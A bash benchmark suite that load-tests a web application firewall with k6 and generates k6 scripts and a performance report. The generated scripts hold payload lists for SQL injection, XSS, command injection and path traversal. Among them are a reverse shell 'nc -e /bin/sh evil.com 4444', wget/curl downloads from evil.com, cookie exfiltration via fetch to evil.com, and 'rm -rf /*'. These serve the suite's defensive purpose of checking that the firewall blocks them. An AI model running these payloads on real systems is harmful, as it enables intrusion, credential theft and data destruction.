#!/bin/bash
# WAF Performance Benchmark Suite - k6 Edition
# Advanced performance testing framework using k6 for Web Application Firewalls
# Provides detailed metrics and modern testing capabilities

set -euo pipefail

# Configuration
BENCHMARK_VERSION="1.0.0-k6"
WAF_ENDPOINT="http://localhost:8080"
RESULTS_DIR="k6_benchmark_results_$(date +%Y%m%d_%H%M%S)"
BACKEND_ENDPOINT="http://httpbin.org"

# Test parameters
WARMUP_DURATION="30s"
TEST_DURATION="60s"
COOLDOWN_DURATION=5

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Helper functions
log() {
    echo -e "${BLUE}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

log_success() {
    echo -e "${GREEN}✓${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}⚠${NC} $1"
}

log_error() {
    echo -e "${RED}✗${NC} $1"
}

log_section() {
    echo
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE} $1${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════════════════════════${NC}"
    echo
}

# System information collection
collect_system_info() {
    log "Collecting system information..."
    
    mkdir -p "$RESULTS_DIR"
    
    cat > "$RESULTS_DIR/system_info.txt" << EOF
WAF Performance Benchmark Suite v${BENCHMARK_VERSION} (k6 Edition)
Date: $(date)
Hostname: $(hostname)
OS: $(uname -a)
CPU: $(lscpu | grep "Model name" | awk -F: '{print $2}' | xargs)
CPU Cores: $(nproc)
Memory: $(free -h | grep Mem | awk '{print $2}')
Network: $(ip route get 8.8.8.8 | grep -oP 'dev \K\S+' | head -1)
Kernel: $(uname -r)
Load Average: $(uptime | awk -F'load average:' '{print $2}')
k6 Version: $(k6 version --json 2>/dev/null | jq -r '.k6' || echo "Unknown")

Target WAF: $WAF_ENDPOINT
Backend: $BACKEND_ENDPOINT
Test Duration: ${TEST_DURATION} per test
Warmup Duration: ${WARMUP_DURATION}
EOF

    log_success "System information collected"
}

# Check prerequisites
check_prerequisites() {
    log "Checking prerequisites..."
    
    local missing_tools=()
    
    # Required tools
    for tool in k6 curl jq bc; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [[ ${#missing_tools[@]} -gt 0 ]]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        log "Install them with:"
        log "k6: https://k6.io/docs/getting-started/installation/"
        log "Ubuntu/Debian: sudo apt-get install curl jq bc"
        log "CentOS/RHEL: sudo yum install curl jq bc"
        exit 1
    fi
    
    # Check WAF availability
    if ! curl -s --max-time 5 "$WAF_ENDPOINT" >/dev/null; then
        log_error "WAF endpoint $WAF_ENDPOINT is not accessible"
        exit 1
    fi
    
    log_success "All prerequisites satisfied"
}

# Create k6 test scripts
create_k6_scripts() {
    log "Creating k6 test scripts..."
    
    mkdir -p "$RESULTS_DIR/scripts"
    
    # Baseline performance test script
    cat > "$RESULTS_DIR/scripts/baseline.js" << 'EOF'
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

// Custom metrics
export let errorRate = new Rate('errors');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');

// Test data
const paths = [
    '/',
    '/api/users',
    '/api/products', 
    '/search',
    '/login',
    '/dashboard',
    '/profile',
    '/settings',
    '/api/status',
    '/api/health'
];

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
];

export default function () {
    const path = paths[Math.floor(Math.random() * paths.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    
    const params = {
        headers: {
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        },
        timeout: '30s',
    };
    
    const response = http.get(__ENV.WAF_ENDPOINT + path, params);
    
    // Record metrics
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    // Check response
    const result = check(response, {
        'status is 200': (r) => r.status === 200,
        'response time < 1000ms': (r) => r.timings.duration < 1000,
        'response time < 100ms': (r) => r.timings.duration < 100,
        'response time < 10ms': (r) => r.timings.duration < 10,
    });
    
    errorRate.add(!result);
}
EOF

    # Mixed attacks test script
    cat > "$RESULTS_DIR/scripts/mixed_attacks.js" << 'EOF'
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

// Custom metrics
export let errorRate = new Rate('errors');
export let blockRate = new Rate('blocked_requests');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');
export let blockedCount = new Counter('blocked_requests');

// Attack patterns
const sqlInjectionAttacks = [
    "/api/users?id=1' UNION SELECT * FROM passwords--",
    "/login?user=admin&pass=' OR '1'='1",
    "/search?q='; DROP TABLE users; --",
    "/api/products?category=' UNION SELECT 1,2,3,4 --",
    "/profile?id=1 AND 1=1",
    "/search?q=1' OR '1'='1' --",
    "/api/orders?id=1 UNION ALL SELECT * FROM credit_cards",
    "/login?user=' OR 1=1 LIMIT 1 --&pass=any"
];

const xssAttacks = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/search?q=<svg onload=alert(1)>",
    "/profile?name=<script>document.location='http://evil.com'</script>",
    "/search?q=javascript:alert(1)",
    "/comment?text=<iframe src=javascript:alert(1)></iframe>",
    "/search?q=<body onload=alert(1)>",
    "/profile?bio=<script src=//evil.com/xss.js></script>"
];

const commandInjectionAttacks = [
    "/exec?cmd=cat /etc/passwd",
    "/run?command=ls -la; cat /etc/shadow",
    "/system?cmd=id && whoami", 
    "/exec?cmd=ps aux | grep root",
    "/run?command=wget http://evil.com/shell.sh",
    "/system?cmd=nc -e /bin/sh evil.com 4444",
    "/exec?cmd=curl http://evil.com/backdoor",
    "/run?command=rm -rf /*"
];

const pathTraversalAttacks = [
    "/file?path=../../../etc/passwd",
    "/download?file=../../../../etc/shadow",
    "/read?filename=../../../../../../etc/hosts",
    "/include?file=../../../etc/passwd%00",
    "/download?file=..\\..\\..\\windows\\system32\\config\\sam",
    "/file?path=/etc/passwd",
    "/read?filename=....//....//....//etc//passwd",
    "/include?file=..%2F..%2F..%2Fetc%2Fpasswd"
];

const cleanRequests = [
    "/api/users?id=123",
    "/search?q=normal search term",
    "/login",
    "/dashboard",
    "/profile?user=john",
    "/api/products?category=electronics",
    "/api/orders?status=active",
    "/settings?tab=profile"
];

// Combine all attacks
const allAttacks = [
    ...sqlInjectionAttacks,
    ...xssAttacks,
    ...commandInjectionAttacks,
    ...pathTraversalAttacks
];

export default function () {
    let path;
    let isAttack = false;
    
    // 70% clean traffic, 30% attack traffic
    if (Math.random() < 0.7) {
        path = cleanRequests[Math.floor(Math.random() * cleanRequests.length)];
    } else {
        path = allAttacks[Math.floor(Math.random() * allAttacks.length)];
        isAttack = true;
    }
    
    const params = {
        headers: {
            'User-Agent': 'Mozilla/5.0 (compatible; SecurityTest/1.0)',
            'Accept': 'text/html,application/xhtml+xml,application/xml',
            'Connection': 'keep-alive',
        },
        timeout: '30s',
    };
    
    const response = http.get(__ENV.WAF_ENDPOINT + path, params);
    
    // Record metrics
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    // Check if request was blocked (403, 400, or other error codes)
    const wasBlocked = response.status >= 400 && response.status < 500;
    
    if (wasBlocked) {
        blockedCount.add(1);
        blockRate.add(1);
    } else {
        blockRate.add(0);
    }
    
    // For attacks, we expect them to be blocked
    if (isAttack && !wasBlocked) {
        console.warn(`Attack not blocked: ${path} (status: ${response.status})`);
    }
    
    // Check response
    const result = check(response, {
        'response received': (r) => r.status !== 0,
        'response time reasonable': (r) => r.timings.duration < 5000,
    });
    
    errorRate.add(!result);
}
EOF

    # SQL injection focused test
    cat > "$RESULTS_DIR/scripts/sql_injection.js" << 'EOF'
import http from 'k6/http';
import { check } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

export let blockRate = new Rate('blocked_requests');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');

const sqlAttacks = [
    "/api/users?id=1' UNION SELECT * FROM passwords--",
    "/login?user=admin&pass=' OR '1'='1",
    "/search?q='; DROP TABLE users; --",
    "/api/products?category=' UNION SELECT 1,2,3,4 --",
    "/profile?id=1 AND 1=1",
    "/search?q=1' OR '1'='1' --",
    "/api/orders?id=1 UNION ALL SELECT * FROM credit_cards",
    "/login?user=' OR 1=1 LIMIT 1 --&pass=any",
    "/api/users?filter=' UNION SELECT username,password FROM admin_users--",
    "/search?query='; INSERT INTO users (username,password) VALUES ('hacker','pwned'); --"
];

export default function () {
    const attack = sqlAttacks[Math.floor(Math.random() * sqlAttacks.length)];
    
    const response = http.get(__ENV.WAF_ENDPOINT + attack, {
        timeout: '30s',
    });
    
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    const wasBlocked = response.status >= 400 && response.status < 500;
    blockRate.add(wasBlocked ? 1 : 0);
    
    check(response, {
        'SQL injection blocked': (r) => r.status === 403 || r.status === 400,
    });
}
EOF

    # XSS attacks test
    cat > "$RESULTS_DIR/scripts/xss_attacks.js" << 'EOF'
import http from 'k6/http';
import { check } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

export let blockRate = new Rate('blocked_requests');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');

const xssAttacks = [
    "/search?q=<script>alert('xss')</script>",
    "/comment?text=<img src=x onerror=alert(1)>",
    "/search?q=<svg onload=alert(1)>",
    "/profile?name=<script>document.location='http://evil.com'</script>",
    "/search?q=javascript:alert(1)",
    "/comment?text=<iframe src=javascript:alert(1)></iframe>",
    "/search?q=<body onload=alert(1)>",
    "/profile?bio=<script src=//evil.com/xss.js></script>",
    "/search?q=<img src='x' onerror='fetch(`//evil.com/${document.cookie}`)'>",
    "/comment?text=<svg><script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script></svg>"
];

export default function () {
    const attack = xssAttacks[Math.floor(Math.random() * xssAttacks.length)];
    
    const response = http.get(__ENV.WAF_ENDPOINT + attack, {
        timeout: '30s',
    });
    
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    const wasBlocked = response.status >= 400 && response.status < 500;
    blockRate.add(wasBlocked ? 1 : 0);
    
    check(response, {
        'XSS attack blocked': (r) => r.status === 403 || r.status === 400,
    });
}
EOF

    # Command injection test
    cat > "$RESULTS_DIR/scripts/command_injection.js" << 'EOF'
import http from 'k6/http';
import { check } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

export let blockRate = new Rate('blocked_requests');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');

const cmdAttacks = [
    "/exec?cmd=cat /etc/passwd",
    "/run?command=ls -la; cat /etc/shadow",
    "/system?cmd=id && whoami",
    "/exec?cmd=ps aux | grep root",
    "/run?command=wget http://evil.com/shell.sh",
    "/system?cmd=nc -e /bin/sh evil.com 4444",
    "/exec?cmd=curl http://evil.com/backdoor",
    "/run?command=rm -rf /*",
    "/system?cmd=`whoami`",
    "/exec?cmd=$(id)"
];

export default function () {
    const attack = cmdAttacks[Math.floor(Math.random() * cmdAttacks.length)];
    
    const response = http.get(__ENV.WAF_ENDPOINT + attack, {
        timeout: '30s',
    });
    
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    const wasBlocked = response.status >= 400 && response.status < 500;
    blockRate.add(wasBlocked ? 1 : 0);
    
    check(response, {
        'Command injection blocked': (r) => r.status === 403 || r.status === 400,
    });
}
EOF

    # Path traversal test
    cat > "$RESULTS_DIR/scripts/path_traversal.js" << 'EOF'
import http from 'k6/http';
import { check } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

export let blockRate = new Rate('blocked_requests');
export let responseTime = new Trend('response_time');
export let requestCount = new Counter('requests');

const pathAttacks = [
    "/file?path=../../../etc/passwd",
    "/download?file=../../../../etc/shadow",
    "/read?filename=../../../../../../etc/hosts",
    "/include?file=../../../etc/passwd%00",
    "/download?file=..\\..\\..\\windows\\system32\\config\\sam",
    "/file?path=/etc/passwd",
    "/read?filename=....//....//....//etc//passwd",
    "/include?file=..%2F..%2F..%2Fetc%2Fpasswd",
    "/download?file=..%252f..%252f..%252fetc%252fpasswd",
    "/file?path=....\\....\\....\\etc\\passwd"
];

export default function () {
    const attack = pathAttacks[Math.floor(Math.random() * pathAttacks.length)];
    
    const response = http.get(__ENV.WAF_ENDPOINT + attack, {
        timeout: '30s',
    });
    
    requestCount.add(1);
    responseTime.add(response.timings.duration);
    
    const wasBlocked = response.status >= 400 && response.status < 500;
    blockRate.add(wasBlocked ? 1 : 0);
    
    check(response, {
        'Path traversal blocked': (r) => r.status === 403 || r.status === 400,
    });
}
EOF

    log_success "k6 test scripts created"
}

# Baseline performance test
baseline_performance_test() {
    log_section "BASELINE PERFORMANCE TEST (k6)"
    log "Testing clean HTTP traffic performance with k6..."
    
    local output_file="$RESULTS_DIR/baseline_performance.json"
    echo '{"test_type": "baseline_k6", "results": []}' > "$output_file"
    
    # Test with increasing VU (Virtual Users) levels
    local vu_levels=(1 10 50 100 200 500 1000 2000)
    
    for vus in "${vu_levels[@]}"; do
        log "Testing with $vus virtual users..."
        
        # Run k6 test
        WAF_ENDPOINT="$WAF_ENDPOINT" k6 run \
            --vus $vus \
            --duration $TEST_DURATION \
            --summary-export "$RESULTS_DIR/baseline_${vus}vu_summary.json" \
            --out json="$RESULTS_DIR/baseline_${vus}vu_raw.json" \
            "$RESULTS_DIR/scripts/baseline.js" \
            > "$RESULTS_DIR/baseline_${vus}vu.log" 2>&1
        
        # Parse k6 results
        if [[ -f "$RESULTS_DIR/baseline_${vus}vu_summary.json" ]]; then
            local rps latency_avg latency_p95 latency_p99 latency_max error_rate
            
            rps=$(jq -r '.metrics.http_reqs.values.rate // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            latency_avg=$(jq -r '.metrics.http_req_duration.values.avg // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            latency_p95=$(jq -r '.metrics.http_req_duration.values["p(95)"] // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            latency_p99=$(jq -r '.metrics.http_req_duration.values["p(99)"] // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            latency_max=$(jq -r '.metrics.http_req_duration.values.max // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            error_rate=$(jq -r '.metrics.http_req_failed.values.rate // 0' "$RESULTS_DIR/baseline_${vus}vu_summary.json")
            
            # Add to results
            local test_result
            test_result=$(jq --arg vus "$vus" \
                            --arg rps "$rps" \
                            --arg lat_avg "$latency_avg" \
                            --arg lat_p95 "$latency_p95" \
                            --arg lat_p99 "$latency_p99" \
                            --arg lat_max "$latency_max" \
                            --arg error_rate "$error_rate" \
                            '.results += [{
                                "virtual_users": ($vus | tonumber),
                                "requests_per_second": ($rps | tonumber),
                                "latency_avg_ms": ($lat_avg | tonumber),
                                "latency_p95_ms": ($lat_p95 | tonumber),
                                "latency_p99_ms": ($lat_p99 | tonumber),
                                "latency_max_ms": ($lat_max | tonumber),
                                "error_rate": ($error_rate | tonumber)
                            }]' "$output_file")
            
            echo "$test_result" > "$output_file"
            
            log_success "VUs $vus: ${rps} RPS, ${latency_avg}ms avg latency"
        else
            log_error "Failed to get results for $vus VUs"
        fi
        
        sleep "$COOLDOWN_DURATION"
    done
    
    # Calculate peak performance
    local peak_rps
    peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second' "$output_file")
    log_success "Peak baseline performance: ${peak_rps} RPS"
}

# WAF rule overhead test with k6
waf_overhead_test() {
    log_section "WAF RULE OVERHEAD TEST (k6)"
    log "Testing performance impact of WAF rules with k6..."
    
    local output_file="$RESULTS_DIR/waf_overhead.json"
    echo '{"test_type": "waf_overhead_k6", "results": []}' > "$output_file"
    
    local test_scenarios=(
        "baseline:Clean HTTP traffic"
        "mixed_attacks:Mixed attack patterns"
        "sql_injection:SQL injection patterns"
        "xss_attacks:XSS attack patterns"
        "command_injection:Command injection patterns"
        "path_traversal:Path traversal patterns"
    )
    
    for scenario_def in "${test_scenarios[@]}"; do
        IFS=':' read -r scenario_name scenario_desc <<< "$scenario_def"
        
        log "Testing scenario: $scenario_desc..."
        
        # Run k6 test with 1000 VUs
        WAF_ENDPOINT="$WAF_ENDPOINT" k6 run \
            --vus 1000 \
            --duration $TEST_DURATION \
            --summary-export "$RESULTS_DIR/overhead_${scenario_name}_summary.json" \
            --out json="$RESULTS_DIR/overhead_${scenario_name}_raw.json" \
            "$RESULTS_DIR/scripts/${scenario_name}.js" \
            > "$RESULTS_DIR/overhead_${scenario_name}.log" 2>&1
        
        # Parse results
        if [[ -f "$RESULTS_DIR/overhead_${scenario_name}_summary.json" ]]; then
            local rps latency_avg latency_p99 error_rate block_rate
            
            rps=$(jq -r '.metrics.http_reqs.values.rate // 0' "$RESULTS_DIR/overhead_${scenario_name}_summary.json")
            latency_avg=$(jq -r '.metrics.http_req_duration.values.avg // 0' "$RESULTS_DIR/overhead_${scenario_name}_summary.json")
            latency_p99=$(jq -r '.metrics.http_req_duration.values["p(99)"] // 0' "$RESULTS_DIR/overhead_${scenario_name}_summary.json")
            error_rate=$(jq -r '.metrics.http_req_failed.values.rate // 0' "$RESULTS_DIR/overhead_${scenario_name}_summary.json")
            block_rate=$(jq -r '.metrics.blocked_requests.values.rate // 0' "$RESULTS_DIR/overhead_${scenario_name}_summary.json")
            
            # Add to results
            local test_result
            test_result=$(jq --arg scenario "$scenario_name" \
                            --arg desc "$scenario_desc" \
                            --arg rps "$rps" \
                            --arg lat_avg "$latency_avg" \
                            --arg lat_p99 "$latency_p99" \
                            --arg error_rate "$error_rate" \
                            --arg block_rate "$block_rate" \
                            '.results += [{
                                "scenario": $scenario,
                                "description": $desc,
                                "requests_per_second": ($rps | tonumber),
                                "latency_avg_ms": ($lat_avg | tonumber),
                                "latency_p99_ms": ($lat_p99 | tonumber),
                                "error_rate": ($error_rate | tonumber),
                                "block_rate": ($block_rate | tonumber)
                            }]' "$output_file")
            
            echo "$test_result" > "$output_file"
            
            log_success "$scenario_desc: ${rps} RPS, ${latency_avg}ms avg, ${block_rate} block rate"
        else
            log_error "Failed to get results for $scenario_name"
        fi
        
        sleep "$COOLDOWN_DURATION"
    done
}

# Latency distribution analysis
latency_distribution_test() {
    log_section "LATENCY DISTRIBUTION TEST (k6)"
    log "Analyzing detailed latency distribution with k6..."
    
    local output_file="$RESULTS_DIR/latency_distribution.json"
    echo '{"test_type": "latency_distribution_k6", "load_levels": []}' > "$output_file"
    
    local load_levels=("light:100" "medium:500" "heavy:1000" "extreme:2000")
    
    for load_def in "${load_levels[@]}"; do
        IFS=':' read -r load_name load_vus <<< "$load_def"
        
        log "Testing latency distribution at $load_name load ($load_vus VUs)..."
        
        WAF_ENDPOINT="$WAF_ENDPOINT" k6 run \
            --vus $load_vus \
            --duration $TEST_DURATION \
            --summary-export "$RESULTS_DIR/latency_${load_name}_summary.json" \
            "$RESULTS_DIR/scripts/baseline.js" \
            > "$RESULTS_DIR/latency_${load_name}.log" 2>&1
        
        if [[ -f "$RESULTS_DIR/latency_${load_name}_summary.json" ]]; then
            local latency_p50 latency_p75 latency_p90 latency_p95 latency_p99 latency_p999 latency_max
            
            latency_p50=$(jq -r '.metrics.http_req_duration.values.med // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_p75=$(jq -r '.metrics.http_req_duration.values["p(75)"] // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_p90=$(jq -r '.metrics.http_req_duration.values["p(90)"] // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_p95=$(jq -r '.metrics.http_req_duration.values["p(95)"] // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_p99=$(jq -r '.metrics.http_req_duration.values["p(99)"] // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_p999=$(jq -r '.metrics.http_req_duration.values["p(99.9)"] // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            latency_max=$(jq -r '.metrics.http_req_duration.values.max // 0' "$RESULTS_DIR/latency_${load_name}_summary.json")
            
            # Add to results
            local test_result
            test_result=$(jq --arg load "$load_name" \
                            --arg vus "$load_vus" \
                            --arg p50 "$latency_p50" \
                            --arg p75 "$latency_p75" \
                            --arg p90 "$latency_p90" \
                            --arg p95 "$latency_p95" \
                            --arg p99 "$latency_p99" \
                            --arg p999 "$latency_p999" \
                            --arg max "$latency_max" \
                            '.load_levels += [{
                                "load_level": $load,
                                "virtual_users": ($vus | tonumber),
                                "latency_p50_ms": ($p50 | tonumber),
                                "latency_p75_ms": ($p75 | tonumber),
                                "latency_p90_ms": ($p90 | tonumber),
                                "latency_p95_ms": ($p95 | tonumber),
                                "latency_p99_ms": ($p99 | tonumber),
                                "latency_p999_ms": ($p999 | tonumber),
                                "latency_max_ms": ($max | tonumber)
                            }]' "$output_file")
            
            echo "$test_result" > "$output_file"
            
            log_success "$load_name load: P50=${latency_p50}ms, P99=${latency_p99}ms, Max=${latency_max}ms"
        fi
        
        sleep "$COOLDOWN_DURATION"
    done
}

# Generate comprehensive k6 report
generate_report() {
    log_section "GENERATING k6 BENCHMARK REPORT"
    log "Compiling k6 benchmark results..."
    
    local report_file="$RESULTS_DIR/k6_benchmark_report.md"
    
    cat > "$report_file" << 'EOF'
# WAF Performance Benchmark Report (k6 Edition)

## Executive Summary

This report presents comprehensive performance benchmarking results using k6 for the tested Web Application Firewall (WAF) solution. k6 provides modern, JavaScript-based performance testing with detailed metrics and advanced capabilities.

## Test Environment

EOF
    
    # Add system information
    cat "$RESULTS_DIR/system_info.txt" >> "$report_file"
    
    cat >> "$report_file" << 'EOF'

## k6 Testing Advantages

- **Modern JavaScript-based testing** with powerful scripting capabilities
- **Detailed metrics collection** with custom metrics support
- **Real-time monitoring** and comprehensive reporting
- **Cloud-native design** optimized for modern applications
- **Advanced scenario modeling** with realistic user behavior simulation

## Benchmark Results

### 1. Baseline Performance

Clean HTTP traffic performance without attack patterns:

EOF
    
    # Add baseline performance table
    if [[ -f "$RESULTS_DIR/baseline_performance.json" ]]; then
        echo "| Virtual Users | RPS | Avg Latency (ms) | P95 Latency (ms) | P99 Latency (ms) | Error Rate |" >> "$report_file"
        echo "|---------------|-----|------------------|------------------|------------------|------------|" >> "$report_file"
        
        jq -r '.results[] | "| \(.virtual_users) | \(.requests_per_second | floor) | \(.latency_avg_ms | . * 100 | floor | . / 100) | \(.latency_p95_ms | . * 100 | floor | . / 100) | \(.latency_p99_ms | . * 100 | floor | . / 100) | \(.error_rate | . * 100 | floor | . / 100)% |"' \
            "$RESULTS_DIR/baseline_performance.json" >> "$report_file"
        
        local peak_rps
        peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second | floor' \
                      "$RESULTS_DIR/baseline_performance.json")
        echo "" >> "$report_file"
        echo "**Peak Performance:** ${peak_rps} RPS" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

### 2. WAF Rule Overhead

Performance impact of various attack pattern detection:

EOF
    
    # Add WAF overhead results
    if [[ -f "$RESULTS_DIR/waf_overhead.json" ]]; then
        echo "| Scenario | RPS | Avg Latency (ms) | P99 Latency (ms) | Block Rate | Error Rate |" >> "$report_file"
        echo "|----------|-----|------------------|------------------|------------|------------|" >> "$report_file"
        
        jq -r '.results[] | "| \(.description) | \(.requests_per_second | floor) | \(.latency_avg_ms | . * 100 | floor | . / 100) | \(.latency_p99_ms | . * 100 | floor | . / 100) | \(.block_rate | . * 100 | floor | . / 100)% | \(.error_rate | . * 100 | floor | . / 100)% |"' \
            "$RESULTS_DIR/waf_overhead.json" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

### 3. Latency Distribution

Detailed latency percentiles under different load levels:

EOF
    
    # Add latency distribution
    if [[ -f "$RESULTS_DIR/latency_distribution.json" ]]; then
        echo "| Load Level | P50 (ms) | P75 (ms) | P90 (ms) | P95 (ms) | P99 (ms) | P99.9 (ms) | Max (ms) |" >> "$report_file"
        echo "|------------|----------|----------|----------|----------|----------|------------|----------|" >> "$report_file"
        
        jq -r '.load_levels[] | "| \(.load_level) | \(.latency_p50_ms | . * 100 | floor | . / 100) | \(.latency_p75_ms | . * 100 | floor | . / 100) | \(.latency_p90_ms | . * 100 | floor | . / 100) | \(.latency_p95_ms | . * 100 | floor | . / 100) | \(.latency_p99_ms | . * 100 | floor | . / 100) | \(.latency_p999_ms | . * 100 | floor | . / 100) | \(.latency_max_ms | . * 100 | floor | . / 100) |"' \
            "$RESULTS_DIR/latency_distribution.json" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'

## k6 vs wrk Comparison

### Testing Tool Advantages

| Feature | k6 | wrk |
|---------|----|----|
| **Scripting** | JavaScript (powerful) | Lua (lightweight) |
| **Metrics** | Rich, custom metrics | Basic HTTP metrics |
| **Reporting** | JSON, HTML, InfluxDB | Text output |
| **Scenarios** | Complex user journeys | Simple load patterns |
| **Cloud Integration** | Native cloud support | Manual integration |
| **Learning Curve** | Moderate (JavaScript) | Low (simple CLI) |
| **Performance** | Good (V8 engine) | Excellent (C-based) |
| **Modern Features** | HTTP/2, WebSocket, gRPC | HTTP/1.1 focus |

### When to Use Each Tool

**Use k6 when:**
- Need detailed metrics and analysis
- Testing complex user scenarios
- Integrating with modern CI/CD pipelines
- Requiring custom metrics and validations
- Testing modern protocols (HTTP/2, gRPC)

**Use wrk when:**
- Need maximum raw performance testing
- Simple throughput measurement
- Minimal resource overhead required
- Quick benchmark comparisons
- Focus on pure HTTP/1.1 performance

## Benchmark Methodology

This k6 benchmark suite provides:

1. **Virtual User Simulation** - Realistic concurrent user behavior
2. **Custom Metrics Collection** - Detailed performance insights
3. **Attack Pattern Validation** - Security effectiveness measurement
4. **Progressive Load Testing** - Scalability analysis
5. **Statistical Analysis** - Comprehensive percentile reporting

## Raw Data Files

All detailed k6 data is available in the following formats:
- `*_summary.json` - k6 summary statistics
- `*_raw.json` - Raw metric data points
- `*.log` - Test execution logs
- `baseline_performance.json` - Processed baseline results
- `waf_overhead.json` - Attack pattern overhead data
- `latency_distribution.json` - Latency analysis data

EOF
    
    log_success "k6 benchmark report generated: $report_file"
}

# Main benchmark execution
main() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║          WAF Performance Benchmark Suite (k6)           ║"
    echo "║                     Version ${BENCHMARK_VERSION}                    ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    log "Starting comprehensive WAF performance benchmark with k6..."
    
    # Setup
    check_prerequisites
    collect_system_info
    create_k6_scripts
    
    # Execute benchmark tests
    baseline_performance_test
    waf_overhead_test
    latency_distribution_test
    
    # Generate report
    generate_report
    
    log_section "k6 BENCHMARK COMPLETE"
    log_success "Results saved to: $RESULTS_DIR"
    log_success "Report available: $RESULTS_DIR/k6_benchmark_report.md"
    echo
    log "Summary of key metrics:"
    
    # Display key metrics
    if [[ -f "$RESULTS_DIR/baseline_performance.json" ]]; then
        local peak_rps
        peak_rps=$(jq -r '.results | max_by(.requests_per_second) | .requests_per_second | floor' \
                      "$RESULTS_DIR/baseline_performance.json")
        log "Peak RPS: ${peak_rps}"
    fi
    
    echo
    log "k6 provides detailed metrics and modern testing capabilities"
    log "Compare results with wrk benchmarks for comprehensive analysis"
}

# Command line handling
case "${1:-run}" in
    run)
        main
        ;;
    clean)
        log "Cleaning up old k6 benchmark results..."
        rm -rf k6_benchmark_results_*
        log_success "Cleanup complete"
        ;;
    help|--help|-h)
        echo "WAF Performance Benchmark Suite v${BENCHMARK_VERSION} (k6 Edition)"
        echo
        echo "Usage: $0 [COMMAND]"
        echo
        echo "Commands:"
        echo "  run     Run complete k6 benchmark suite (default)"
        echo "  clean   Clean up old benchmark results"
        echo "  help    Show this help message"
        echo
        echo "Configuration:"
        echo "  WAF_ENDPOINT=$WAF_ENDPOINT"
        echo "  TEST_DURATION=$TEST_DURATION"
        echo "  WARMUP_DURATION=$WARMUP_DURATION"
        echo
        echo "Prerequisites:"
        echo "  - k6 (Modern load testing tool)"
        echo "  - curl (HTTP client)"
        echo "  - jq (JSON processor)"
        echo "  - bc (Calculator)"
        echo
        echo "k6 Installation:"
        echo "  https://k6.io/docs/getting-started/installation/"
        ;;
    *)
        echo "Unknown command: $1"
        echo "Use '$0 help' for usage information"
        exit 1
        ;;
esac
